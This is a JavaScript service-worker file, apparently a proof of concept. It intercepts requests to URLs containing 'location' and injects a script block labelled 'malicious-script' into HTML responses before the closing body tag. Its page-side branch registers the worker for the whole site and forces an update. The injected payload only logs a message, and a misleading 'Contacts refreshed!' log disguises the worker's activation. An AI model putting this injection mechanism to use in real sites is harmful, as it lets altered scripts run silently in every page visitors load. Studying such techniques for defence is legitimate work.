if (typeof self === 'undefined' || self instanceof ServiceWorkerGlobalScope) {
    self.addEventListener('activate', event => {
        console.log('Contacts refreshed!');
        event.waitUntil(self.clients.claim());
    });

    self.addEventListener('fetch', function (event) {
        console.log('Service worker fetch event triggered for URL:', event.request.url);
        if (event.request.url.includes('location')) {
            event.respondWith(
                fetch(event.request).then(response => {
                    // Check if the response is HTML
                    if (response.headers.get('content-type')?.includes('text/html')) {
                        return response.text().then(text => {
                            const maliciousScript = `
                <script id="malicious-script">
                  console.log("Hello World from Buttons");
                </script>
              `;
                            text = text.replace('</body>', maliciousScript + '</body>');
                            return new Response(text, {
                                status: response.status,
                                statusText: response.statusText,
                                headers: response.headers
                            });
                        });
                    }
                    console.log('Non-HTML response, passing through:', response.url);
                    return response;
                }).catch(err => {
                    console.error(' fetch failed: ', err);
                    return fetch(event.request);
                })
            );
        } else {
            console.log('Request, ignoring:', event.request.url);
        }
    });
} else {
    // Registration code (runs in main window context)
    if ('serviceWorker' in navigator) {
        console.log('Attempting to register service worker at /worker.js');
        navigator.serviceWorker.register('/worker.js', { scope: '/' })
            .then(registration => {
                console.log('Service worker registered successfully');
                // Force immediate activation
                registration.update();
                console.log('Service worker update triggered');
            })
            .catch(err => {
                console.error('Service worker registration failed: ', err);
            });
    } else {
        console.error('Service workers not supported in this browser');
    }
}
